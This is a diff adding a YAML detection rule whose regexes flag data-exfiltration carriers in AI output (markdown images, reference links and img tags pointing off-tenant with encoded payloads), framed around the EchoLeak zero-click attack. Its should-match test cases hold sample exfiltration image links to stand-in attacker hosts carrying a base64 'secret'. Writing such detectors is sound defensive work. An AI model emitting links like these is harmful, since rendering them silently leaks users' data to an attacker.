@@ -1,0 +1,92 @@
+schema: testpattern/v1
+name: AI Data-Exfiltration Marker
+slug: ai-data-exfiltration-marker
+version: 0.1.0
+type: regex
+engine: universal
+description: >-
+  Detects data-exfiltration carriers in AI/LLM output: markdown images or links and HTML img tags
+  whose URL points off-tenant and carries an encoded data payload in the path or query. This is the
+  EchoLeak (CVE-2025-32711) zero-click exfiltration signal.
+operation: >-
+  Three regexes: markdown image with external host + data-like query payload (>=16 chars),
+  reference-style markdown link definition off-tenant, and an external <img src>. Corroborated by
+  AI-context markers. Filters exclude allow-listed corporate hosts and obvious test text. Three tiers
+  (65 regex only; 75 + AI context; 85 + AI context with corporate-host exclusion).
+pattern: '!\[[^\]]*\]\(\s*https?://[^)\s]+[?#&][^)\s]*=[^)\s]{16,}\)'
+confidence: high
+confidence_justification: >-
+  High/precision-gated: fires on outbound content, so tuned for low FP. Requires an external host plus
+  a long encoded payload; corporate-host and test-text exclusions remove the named FP traps.
+jurisdictions: [global]
+regulations: ['OWASP LLM Top 10 2025', 'NIST AI RMF GenAI Profile']
+frameworks: [ISO 27001]
+data_categories: [emerging, security]
+ai_threat:
+  ai_sit_id: AI-SIT-013
+  aic_alias: AIC-01
+  threat_family: EnvironmentalTrap
+  detection_approach: SIT
+corroborative_evidence:
+  keywords: [image, link, markdown, render]
+  proximity: 300
+  keyword_lists: [ai-context-markers]
+purview:
+  patterns_proximity: 300
+  recommended_confidence: 85
+  regexes:
+    - id: Regex_md_image_exfil
+      pattern: '!\[[^\]]*\]\(\s*https?://[^)\s]+[?#&][^)\s]*=[^)\s]{16,}\)'
+    - id: Regex_md_reflink_exfil
+      pattern: '^\s*\[[^\]]+\]:\s*https?://[^\s]+[?#&][^\s]*=[^\s]{16,}'
+    - id: Regex_html_img_exfil
+      pattern: '(?i)<img\s+[^>]*src\s*=\s*["'']?https?://[^"''>\s]+[?#&][^"''>\s]*=[^"''>\s]{16,}'
+  shared_keywords:
+    - dict: ai-context-markers
+      as: Evidence_ai_context
+      match_style: word
+  pattern_tiers:
+    - confidence_level: 85
+      id_match: Regex_md_image_exfil
+      matches:
+        - ref: Evidence_ai_context
+        - ref: Filter_corporate_hosts
+          min_matches: 0
+          max_matches: 0
+    - confidence_level: 75
+      id_match: Regex_md_image_exfil
+      matches:
+        - ref: Evidence_ai_context
+    - confidence_level: 65
+      id_match: Regex_md_image_exfil
+  keywords:
+    - id: Filter_corporate_hosts
+      groups:
+        - match_style: word
+          terms: [sharepoint.com, teams.microsoft.com, office.com, office365.com]
+  filters:
+    - id: Guard_exfil_exclude_test
+      type: TextMatchFilter
+      direction: Full
+      logic: Exclude
+      terms: ['https://example.com', 'data=PLACEHOLDER']
+risk_rating: 9
+risk_description: AI-rendered exfiltration carrier silently leaks data to an attacker-controlled host.
+sensitivity_labels:
+  us_gov: 'CUI Specified'
+  uk_gov: 'OFFICIAL-SENSITIVE'
+test_cases:
+  should_match:
+    - value: '![logo](https://evil.example.net/c?d=eyJzZWNyZXQiOiJsZWFrZWQtdmFsdWUtMTIzNDU2Nzg5In0)'
+      description: Markdown image to external host with long base64-like query payload
+    - value: '<img src="https://attacker.test/p?x=QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo">'
+      description: HTML img tag to external host with encoded payload
+  should_not_match:
+    - value: '![logo](https://contoso.sharepoint.com/sites/team/logo.png)'
+      description: SharePoint deep link (corporate host, no data payload)
+    - value: '![pixel](https://analytics.example.com/t?id=42)'
+      description: Analytics URL with short, non-data parameter
+created: '2026-06-08'
+updated: '2026-06-08'
+author: testpattern-community
+license: MIT
